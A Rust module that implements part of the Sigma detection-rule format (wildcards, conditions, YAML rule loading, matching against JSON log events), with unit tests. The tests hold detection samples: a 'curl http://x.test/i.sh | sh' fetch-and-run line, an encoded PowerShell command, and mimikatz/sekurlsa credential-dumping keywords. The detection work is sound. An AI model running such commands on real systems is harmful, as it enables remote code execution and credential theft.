//! A subset of the Sigma rule format: field selections with the `contains`, `startswith`, `endswith`, `all` and `re`
//! modifiers, keyword lists, wildcards, and conditions built from `and`, `or`, `not`, parentheses, `N of`, `all of`.
//!
//! Not supported (and reported as such, never ignored): aggregations (`count`, `near`, `timeframe`), correlation rules,
//! `action: global` collections and the modifiers `base64`, `base64offset`, `windash`, `cidr`, `utf16`, `exists`, `gt`/`lt`.

use std::collections::BTreeMap;
use std::path::Path;

use regex::Regex;
use serde_json::Value as Json;
use serde_yaml::Value as Yaml;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

impl Level {
    pub fn parse(s: &str) -> Option<Level> {
        Some(match s.to_ascii_lowercase().as_str() {
            "informational" | "info" => Level::Informational,
            "low" => Level::Low,
            "medium" => Level::Medium,
            "high" => Level::High,
            "critical" => Level::Critical,
            _ => return None,
        })
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Level::Informational => "informational",
            Level::Low => "low",
            Level::Medium => "medium",
            Level::High => "high",
            Level::Critical => "critical",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum Modifier {
    Contains,
    StartsWith,
    EndsWith,
    All,
    Re,
}

#[derive(Debug)]
enum Pattern {
    /// A case-insensitive wildcard pattern (`*` and `?`, `\` escapes), already lowercased.
    Wild(Vec<WildToken>),
    Re(Regex),
    Null,
}

#[derive(Debug, Clone, PartialEq)]
enum WildToken {
    Lit(char),
    One,
    Many,
}

fn compile_wild(s: &str) -> Vec<WildToken> {
    let mut out = Vec::new();
    let mut chars = s.chars().flat_map(|c| c.to_lowercase()).peekable();
    while let Some(c) = chars.next() {
        match c {
            '\\' => match chars.peek() {
                Some('*') | Some('?') | Some('\\') => {
                    out.push(WildToken::Lit(chars.next().unwrap()))
                }
                _ => out.push(WildToken::Lit('\\')),
            },
            '*' => {
                if out.last() != Some(&WildToken::Many) {
                    out.push(WildToken::Many);
                }
            }
            '?' => out.push(WildToken::One),
            c => out.push(WildToken::Lit(c)),
        }
    }
    out
}

/// Iterative wildcard matcher with backtracking only over the last `*`: O(pattern x text), no pathological blow-up.
fn wild_match(pat: &[WildToken], text: &str) -> bool {
    let text: Vec<char> = text.chars().flat_map(|c| c.to_lowercase()).collect();
    let (mut p, mut t) = (0usize, 0usize);
    let (mut star, mut mark) = (None::<usize>, 0usize);
    while t < text.len() {
        match pat.get(p) {
            Some(WildToken::Many) => {
                star = Some(p);
                mark = t;
                p += 1;
            }
            Some(WildToken::One) => {
                p += 1;
                t += 1;
            }
            Some(WildToken::Lit(c)) if *c == text[t] => {
                p += 1;
                t += 1;
            }
            _ => match star {
                Some(s) => {
                    p = s + 1;
                    mark += 1;
                    t = mark;
                }
                None => return false,
            },
        }
    }
    while pat.get(p) == Some(&WildToken::Many) {
        p += 1;
    }
    p == pat.len()
}

impl Pattern {
    fn matches_str(&self, s: &str) -> bool {
        match self {
            Pattern::Wild(w) => wild_match(w, s),
            Pattern::Re(r) => r.is_match(s),
            Pattern::Null => false,
        }
    }
}

#[derive(Debug)]
struct FieldMatch {
    field: String,
    all: bool,
    patterns: Vec<Pattern>,
}

fn lookup<'a>(event: &'a Json, path: &str) -> Option<&'a Json> {
    if let Some(v) = event.get(path) {
        return Some(v); // flat key that happens to contain dots
    }
    let mut cur = event;
    for part in path.split('.') {
        cur = cur.get(part)?;
    }
    Some(cur)
}

fn scalar_text(v: &Json) -> Option<String> {
    match v {
        Json::String(s) => Some(s.clone()),
        Json::Number(n) => Some(n.to_string()),
        Json::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

fn texts(v: &Json, out: &mut Vec<String>) {
    match v {
        Json::Array(a) => a.iter().for_each(|x| texts(x, out)),
        other => out.extend(scalar_text(other)),
    }
}

impl FieldMatch {
    fn matches(&self, event: &Json) -> bool {
        let value = lookup(event, &self.field);
        let wants_null = self.patterns.iter().any(|p| matches!(p, Pattern::Null));
        let mut vals = Vec::new();
        if let Some(v) = value {
            texts(v, &mut vals);
        }
        let absent = value.is_none() || value == Some(&Json::Null);
        if wants_null && absent {
            return true;
        }
        let real = self.patterns.iter().filter(|p| !matches!(p, Pattern::Null));
        let hit = |p: &Pattern| vals.iter().any(|v| p.matches_str(v));
        if self.all {
            let mut any = false;
            for p in real {
                any = true;
                if !hit(p) {
                    return false;
                }
            }
            any
        } else {
            real.into_iter().any(hit)
        }
    }
}

#[derive(Debug)]
enum Selection {
    /// OR of maps; each map is an AND of field matches.
    Maps(Vec<Vec<FieldMatch>>),
    /// Free-text keywords matched against every string in the event.
    Keywords(Vec<Pattern>),
}

fn all_strings(v: &Json, out: &mut Vec<String>) {
    match v {
        Json::String(s) => out.push(s.clone()),
        Json::Number(n) => out.push(n.to_string()),
        Json::Array(a) => a.iter().for_each(|x| all_strings(x, out)),
        Json::Object(m) => m.values().for_each(|x| all_strings(x, out)),
        _ => {}
    }
}

impl Selection {
    fn matches(&self, event: &Json) -> bool {
        match self {
            Selection::Maps(maps) => maps.iter().any(|m| m.iter().all(|f| f.matches(event))),
            Selection::Keywords(ps) => {
                let mut strings = Vec::new();
                all_strings(event, &mut strings);
                ps.iter().any(|p| strings.iter().any(|s| p.matches_str(s)))
            }
        }
    }
}

#[derive(Debug)]
enum Cond {
    Sel(String),
    Not(Box<Cond>),
    And(Vec<Cond>),
    Or(Vec<Cond>),
    Of { all: bool, pattern: String },
}

struct Parser {
    toks: Vec<String>,
    pos: usize,
}

fn tokenize(s: &str) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    for c in s.chars() {
        match c {
            '(' | ')' => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
                out.push(c.to_string());
            }
            c if c.is_whitespace() => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            '|' => return Err("condition aggregations (|) are not supported".into()),
            c => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    Ok(out)
}

impl Parser {
    fn peek(&self) -> Option<&str> {
        self.toks.get(self.pos).map(|s| s.as_str())
    }

    fn next(&mut self) -> Option<String> {
        let t = self.toks.get(self.pos).cloned();
        self.pos += 1;
        t
    }

    fn or(&mut self) -> Result<Cond, String> {
        let mut parts = vec![self.and()?];
        while self.peek().map(|t| t.eq_ignore_ascii_case("or")) == Some(true) {
            self.pos += 1;
            parts.push(self.and()?);
        }
        Ok(if parts.len() == 1 {
            parts.pop().unwrap()
        } else {
            Cond::Or(parts)
        })
    }

    fn and(&mut self) -> Result<Cond, String> {
        let mut parts = vec![self.not()?];
        while self.peek().map(|t| t.eq_ignore_ascii_case("and")) == Some(true) {
            self.pos += 1;
            parts.push(self.not()?);
        }
        Ok(if parts.len() == 1 {
            parts.pop().unwrap()
        } else {
            Cond::And(parts)
        })
    }

    fn not(&mut self) -> Result<Cond, String> {
        if self.peek().map(|t| t.eq_ignore_ascii_case("not")) == Some(true) {
            self.pos += 1;
            return Ok(Cond::Not(Box::new(self.not()?)));
        }
        self.atom()
    }

    fn atom(&mut self) -> Result<Cond, String> {
        let t = self.next().ok_or("condition ends unexpectedly")?;
        if t == "(" {
            let c = self.or()?;
            if self.next().as_deref() != Some(")") {
                return Err("missing closing parenthesis in condition".into());
            }
            return Ok(c);
        }
        if t == ")" {
            return Err("unexpected ) in condition".into());
        }
        let lower = t.to_ascii_lowercase();
        if (lower == "1" || lower == "all" || lower == "any")
            && self.peek().map(|x| x.eq_ignore_ascii_case("of")) == Some(true)
        {
            self.pos += 1;
            let target = self.next().ok_or("`of` needs a selection name or `them`")?;
            return Ok(Cond::Of {
                all: lower == "all",
                pattern: target,
            });
        }
        if ["and", "or", "of"].contains(&lower.as_str()) {
            return Err(format!("unexpected `{t}` in condition"));
        }
        Ok(Cond::Sel(t))
    }
}

fn parse_condition(s: &str) -> Result<Cond, String> {
    let mut p = Parser {
        toks: tokenize(s)?,
        pos: 0,
    };
    let c = p.or()?;
    if p.pos < p.toks.len() {
        return Err(format!("unexpected `{}` in condition", p.toks[p.pos]));
    }
    Ok(c)
}

#[derive(Debug)]
pub struct Rule {
    pub id: String,
    pub title: String,
    pub level: Level,
    pub tags: Vec<String>,
    selections: BTreeMap<String, Selection>,
    condition: Vec<Cond>, // a list of conditions means "any of them"
}

#[derive(Debug)]
pub struct Match<'a> {
    pub rule: &'a Rule,
    pub event_index: usize,
}

fn yaml_str(v: &Yaml) -> Option<String> {
    match v {
        Yaml::String(s) => Some(s.clone()),
        Yaml::Number(n) => Some(n.to_string()),
        Yaml::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

fn glob_selects(pattern: &str, name: &str) -> bool {
    match pattern.strip_suffix('*') {
        Some(prefix) => name.starts_with(prefix),
        None => pattern == name,
    }
}

fn build_pattern(raw: &Yaml, mods: &[Modifier]) -> Result<Pattern, String> {
    if matches!(raw, Yaml::Null) {
        return Ok(Pattern::Null);
    }
    let s =
        yaml_str(raw).ok_or("only strings, numbers, booleans and null are supported as values")?;
    if mods.contains(&Modifier::Re) {
        return Regex::new(&s)
            .map(Pattern::Re)
            .map_err(|e| format!("bad regular expression {s:?}: {e}"));
    }
    let wrapped = if mods.contains(&Modifier::Contains) {
        format!("*{s}*")
    } else if mods.contains(&Modifier::StartsWith) {
        format!("{s}*")
    } else if mods.contains(&Modifier::EndsWith) {
        format!("*{s}")
    } else {
        s
    };
    Ok(Pattern::Wild(compile_wild(&wrapped)))
}

fn build_field(key: &str, value: &Yaml) -> Result<FieldMatch, String> {
    let mut parts = key.split('|');
    let field = parts.next().unwrap_or("").to_string();
    if field.is_empty() {
        return Err("empty field name".into());
    }
    let mut mods = Vec::new();
    for m in parts {
        mods.push(match m.to_ascii_lowercase().as_str() {
            "contains" => Modifier::Contains,
            "startswith" => Modifier::StartsWith,
            "endswith" => Modifier::EndsWith,
            "all" => Modifier::All,
            "re" => Modifier::Re,
            other => return Err(format!("unsupported modifier `{other}`")),
        });
    }
    let raws: Vec<&Yaml> = match value {
        Yaml::Sequence(s) => s.iter().collect(),
        other => vec![other],
    };
    let patterns = raws
        .into_iter()
        .map(|r| build_pattern(r, &mods))
        .collect::<Result<Vec<_>, _>>()?;
    Ok(FieldMatch {
        field,
        all: mods.contains(&Modifier::All),
        patterns,
    })
}

fn build_selection(name: &str, v: &Yaml) -> Result<Selection, String> {
    let wrap = |e: String| format!("selection `{name}`: {e}");
    match v {
        Yaml::Mapping(m) => Ok(Selection::Maps(vec![map_fields(m).map_err(wrap)?])),
        Yaml::Sequence(items)
            if items.iter().all(|i| matches!(i, Yaml::Mapping(_))) && !items.is_empty() =>
        {
            let mut maps = Vec::new();
            for i in items {
                if let Yaml::Mapping(m) = i {
                    maps.push(map_fields(m).map_err(wrap)?);
                }
            }
            Ok(Selection::Maps(maps))
        }
        Yaml::Sequence(items) => {
            let ps = items
                .iter()
                .map(|i| build_pattern(i, &[Modifier::Contains]))
                .collect::<Result<Vec<_>, _>>()
                .map_err(wrap)?;
            Ok(Selection::Keywords(ps))
        }
        _ => Err(format!("selection `{name}` must be a map or a list")),
    }
}

fn map_fields(m: &serde_yaml::Mapping) -> Result<Vec<FieldMatch>, String> {
    m.iter()
        .map(|(k, v)| build_field(&yaml_str(k).ok_or("field names must be strings")?, v))
        .collect()
}

impl Rule {
    pub fn from_yaml(text: &str) -> Result<Rule, String> {
        let doc: Yaml = serde_yaml::from_str(text).map_err(|e| format!("not valid YAML: {e}"))?;
        let m = doc.as_mapping().ok_or("a rule must be a YAML map")?;
        let get = |k: &str| m.get(Yaml::String(k.into()));
        if get("action").is_some() {
            return Err("collections (`action:`) are not supported".into());
        }
        if get("correlation").is_some() {
            return Err("correlation rules are not supported".into());
        }
        let title = get("title").and_then(yaml_str).ok_or("missing title")?;
        let id = get("id")
            .and_then(yaml_str)
            .unwrap_or_else(|| title.clone());
        let level = get("level")
            .and_then(yaml_str)
            .map(|l| Level::parse(&l).ok_or(format!("unknown level {l:?}")))
            .transpose()?
            .unwrap_or(Level::Medium);
        let tags = match get("tags") {
            Some(Yaml::Sequence(s)) => s.iter().filter_map(yaml_str).collect(),
            _ => Vec::new(),
        };
        let det = get("detection")
            .and_then(|d| d.as_mapping())
            .ok_or("missing detection")?;
        let mut selections = BTreeMap::new();
        let mut condition = Vec::new();
        for (k, v) in det {
            let key = yaml_str(k).ok_or("detection keys must be strings")?;
            match key.as_str() {
                "condition" => {
                    let list: Vec<String> = match v {
                        Yaml::Sequence(s) => s.iter().filter_map(yaml_str).collect(),
                        other => yaml_str(other).into_iter().collect(),
                    };
                    for c in list {
                        condition.push(parse_condition(&c)?);
                    }
                }
                "timeframe" => return Err("`timeframe` (aggregation) is not supported".into()),
                name => {
                    selections.insert(name.to_string(), build_selection(name, v)?);
                }
            }
        }
        if condition.is_empty() {
            return Err("missing condition".into());
        }
        let rule = Rule {
            id,
            title,
            level,
            tags,
            selections,
            condition,
        };
        rule.check_references()?;
        Ok(rule)
    }

    fn check_references(&self) -> Result<(), String> {
        fn walk(c: &Cond, names: &BTreeMap<String, Selection>) -> Result<(), String> {
            match c {
                Cond::Sel(n) => names
                    .contains_key(n)
                    .then_some(())
                    .ok_or(format!("condition refers to unknown selection `{n}`")),
                Cond::Not(x) => walk(x, names),
                Cond::And(v) | Cond::Or(v) => v.iter().try_for_each(|x| walk(x, names)),
                Cond::Of { pattern, .. } => {
                    if pattern == "them" || names.keys().any(|n| glob_selects(pattern, n)) {
                        Ok(())
                    } else {
                        Err(format!("`of {pattern}` selects nothing"))
                    }
                }
            }
        }
        self.condition
            .iter()
            .try_for_each(|c| walk(c, &self.selections))
    }

    fn eval(&self, c: &Cond, event: &Json, cache: &mut BTreeMap<String, bool>) -> bool {
        let sel = |name: &str, cache: &mut BTreeMap<String, bool>| -> bool {
            if let Some(v) = cache.get(name) {
                return *v;
            }
            let r = self
                .selections
                .get(name)
                .map(|s| s.matches(event))
                .unwrap_or(false);
            cache.insert(name.to_string(), r);
            r
        };
        match c {
            Cond::Sel(n) => sel(n, cache),
            Cond::Not(x) => !self.eval(x, event, cache),
            Cond::And(v) => v.iter().all(|x| self.eval(x, event, cache)),
            Cond::Or(v) => v.iter().any(|x| self.eval(x, event, cache)),
            Cond::Of { all, pattern } => {
                let names: Vec<&String> = self
                    .selections
                    .keys()
                    .filter(|n| pattern == "them" || glob_selects(pattern, n))
                    .collect();
                if *all {
                    !names.is_empty() && names.iter().all(|n| sel(n, cache))
                } else {
                    names.iter().any(|n| sel(n, cache))
                }
            }
        }
    }

    pub fn matches(&self, event: &Json) -> bool {
        let mut cache = BTreeMap::new();
        self.condition
            .iter()
            .any(|c| self.eval(c, event, &mut cache))
    }
}

/// Loads every `.yml`/`.yaml` file under `dir`. Returns the rules and the files that could not be used, with the reason.
pub fn load_dir(dir: &Path) -> (Vec<Rule>, Vec<(String, String)>) {
    let mut rules = Vec::new();
    let mut skipped = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    let mut files = Vec::new();
    while let Some(d) = stack.pop() {
        let Ok(rd) = std::fs::read_dir(&d) else {
            skipped.push((d.display().to_string(), "cannot read directory".into()));
            continue;
        };
        for e in rd.flatten() {
            let p = e.path();
            // do not follow symlinks: a rules directory must not be able to point the reader elsewhere
            let Ok(ft) = e.file_type() else { continue };
            if ft.is_dir() {
                stack.push(p);
            } else if ft.is_file()
                && matches!(
                    p.extension().and_then(|x| x.to_str()),
                    Some("yml") | Some("yaml")
                )
            {
                files.push(p);
            }
        }
    }
    files.sort();
    for f in files {
        let name = f.display().to_string();
        match std::fs::read_to_string(&f) {
            Ok(t) => match Rule::from_yaml(&t) {
                Ok(r) => rules.push(r),
                Err(e) => skipped.push((name, e)),
            },
            Err(e) => skipped.push((name, e.to_string())),
        }
    }
    (rules, skipped)
}

/// Runs every rule over every event.
pub fn run<'a>(rules: &'a [Rule], events: &[Json]) -> Vec<Match<'a>> {
    let mut out = Vec::new();
    for (i, ev) in events.iter().enumerate() {
        for r in rules {
            if r.matches(ev) {
                out.push(Match {
                    rule: r,
                    event_index: i,
                });
            }
        }
    }
    out
}

/// Reads events from JSON Lines or from a single JSON array. Lines that are not JSON objects are reported, not dropped silently.
pub fn parse_events(text: &str) -> (Vec<Json>, Vec<usize>) {
    let trimmed = text.trim_start();
    if trimmed.starts_with('[') {
        if let Ok(Json::Array(a)) = serde_json::from_str::<Json>(text) {
            return (a, Vec::new());
        }
    }
    let mut events = Vec::new();
    let mut bad = Vec::new();
    for (n, line) in text.lines().enumerate() {
        if line.trim().is_empty() {
            continue;
        }
        match serde_json::from_str::<Json>(line) {
            Ok(v @ Json::Object(_)) => events.push(v),
            _ => bad.push(n + 1),
        }
    }
    (events, bad)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn rule(y: &str) -> Rule {
        Rule::from_yaml(y).unwrap_or_else(|e| panic!("rule rejected: {e}"))
    }

    #[test]
    fn wildcards_are_case_insensitive_and_escapable() {
        let w = |p: &str, t: &str| wild_match(&compile_wild(p), t);
        assert!(w("*.exe", "C:\\Tools\\A.EXE"));
        assert!(w("a?c", "abc") && !w("a?c", "ac"));
        assert!(w("*", "") && w("a*b*c", "aXXbYYc") && !w("a*b*c", "aXXbYY"));
        assert!(w("a\\*b", "a*b") && !w("a\\*b", "axb"));
        assert!(!w("abc", "abcd"));
        // a hostile pattern must finish quickly (polynomial, not exponential); the answer itself is not the point here
        let _ = w(&format!("{}b", "a*".repeat(200)), &"a".repeat(5000));
    }

    #[test]
    fn encoded_powershell_rule_matches_only_the_encoded_command() {
        let r = rule(
            "title: Encoded PowerShell\nid: t1\nlevel: high\ntags: [attack.execution, attack.t1059.001]\ndetection:\n  img:\n    Image|endswith: '\\powershell.exe'\n  enc:\n    CommandLine|contains:\n      - ' -enc '\n      - ' -encodedcommand '\n  condition: img and enc\n",
        );
        assert!(r.matches(&json!({"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -ENC aGVsbG8="})));
        assert!(!r.matches(&json!({"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell Get-Date"})));
        assert!(!r.matches(&json!({"Image": "C:\\x\\cmd.exe", "CommandLine": "cmd -enc x"})));
        assert_eq!(r.level, Level::High);
        assert_eq!(r.tags.len(), 2);
    }

    #[test]
    fn all_modifier_needs_every_value() {
        let r = rule("title: t\ndetection:\n  s:\n    CommandLine|contains|all: ['curl', '| sh']\n  condition: s\n");
        assert!(r.matches(&json!({"CommandLine": "curl http://x.test/i.sh | sh"})));
        assert!(!r.matches(&json!({"CommandLine": "curl http://x.test/i.sh -o f"})));
    }

    #[test]
    fn list_of_maps_is_or_and_a_map_is_and() {
        let r = rule("title: t\ndetection:\n  s:\n    - Image: a\n      User: root\n    - Image: b\n  condition: s\n");
        assert!(r.matches(&json!({"Image": "a", "User": "root"})));
        assert!(!r.matches(&json!({"Image": "a", "User": "bob"})));
        assert!(r.matches(&json!({"Image": "b"})));
    }

    #[test]
    fn not_and_of_conditions() {
        let r = rule("title: t\ndetection:\n  sel_a:\n    k: 1\n  sel_b:\n    k: 2\n  filter:\n    user: admin\n  condition: 1 of sel_* and not filter\n");
        assert!(r.matches(&json!({"k": 2, "user": "bob"})));
        assert!(!r.matches(&json!({"k": 2, "user": "admin"})));
        assert!(!r.matches(&json!({"k": 3, "user": "bob"})));
        let all = rule(
            "title: t\ndetection:\n  a:\n    x: 1\n  b:\n    y: 2\n  condition: all of them\n",
        );
        assert!(all.matches(&json!({"x": 1, "y": 2})) && !all.matches(&json!({"x": 1})));
    }

    #[test]
    fn keywords_search_every_string_and_nested_fields_work() {
        let r = rule(
            "title: t\ndetection:\n  kw:\n    - mimikatz\n    - 'sekurlsa::*'\n  condition: kw\n",
        );
        assert!(r.matches(&json!({"msg": "ran SEKURLSA::logonpasswords now"})));
        assert!(r.matches(&json!({"a": {"b": ["x", "uses Mimikatz"]}})));
        assert!(!r.matches(&json!({"msg": "harmless"})));
        let n = rule("title: t\ndetection:\n  s:\n    process.name: sshd\n  condition: s\n");
        assert!(
            n.matches(&json!({"process": {"name": "sshd"}}))
                && n.matches(&json!({"process.name": "sshd"}))
        );
    }

    #[test]
    fn null_and_numbers_and_regex() {
        let r = rule("title: t\ndetection:\n  s:\n    ParentImage: null\n    EventID: 4688\n    CommandLine|re: '^cmd(\\.exe)? /c \\d+$'\n  condition: s\n");
        assert!(r.matches(&json!({"EventID": 4688, "CommandLine": "cmd.exe /c 42"})));
        assert!(
            !r.matches(&json!({"EventID": 4688, "ParentImage": "x", "CommandLine": "cmd /c 1"}))
        );
        assert!(!r.matches(&json!({"EventID": 1, "CommandLine": "cmd /c 1"})));
    }

    #[test]
    fn unsupported_features_are_rejected_loudly() {
        let bad = [
            "title: t\ndetection:\n  s:\n    a|base64: x\n  condition: s\n",
            "title: t\ndetection:\n  s:\n    a: x\n  condition: s | count() > 5\n",
            "title: t\ndetection:\n  s:\n    a: x\n  timeframe: 5m\n  condition: s\n",
            "title: t\naction: global\ndetection:\n  s:\n    a: x\n  condition: s\n",
            "title: t\ndetection:\n  s:\n    a: x\n  condition: missing\n",
            "title: t\ndetection:\n  s:\n    a: x\n  condition: s and (\n",
            "title: t\ndetection:\n  s:\n    a|re: '('\n  condition: s\n",
            "title: t\nlevel: severe\ndetection:\n  s:\n    a: x\n  condition: s\n",
            "title: t\ndetection:\n  s:\n    a: x\n  condition: 1 of nothing*\n",
            "- just\n- a list\n",
            "title: t\n",
        ];
        for y in bad {
            assert!(Rule::from_yaml(y).is_err(), "should be rejected: {y}");
        }
    }

    #[test]
    fn events_parse_from_jsonl_and_arrays_and_report_bad_lines() {
        let (e, bad) = parse_events("{\"a\":1}\n\nnot json\n[1]\n{\"b\":2}\n");
        assert_eq!(e.len(), 2);
        assert_eq!(bad, vec![3, 4]);
        let (e, bad) = parse_events("[{\"a\":1},{\"a\":2}]");
        assert_eq!((e.len(), bad.len()), (2, 0));
    }

    #[test]
    fn run_reports_event_indexes() {
        let rules = vec![rule(
            "title: t\ndetection:\n  s:\n    k: x\n  condition: s\n",
        )];
        let events = vec![json!({"k": "y"}), json!({"k": "x"}), json!({"k": "X"})];
        let idx: Vec<usize> = run(&rules, &events).iter().map(|m| m.event_index).collect();
        assert_eq!(idx, vec![1, 2]);
    }
}
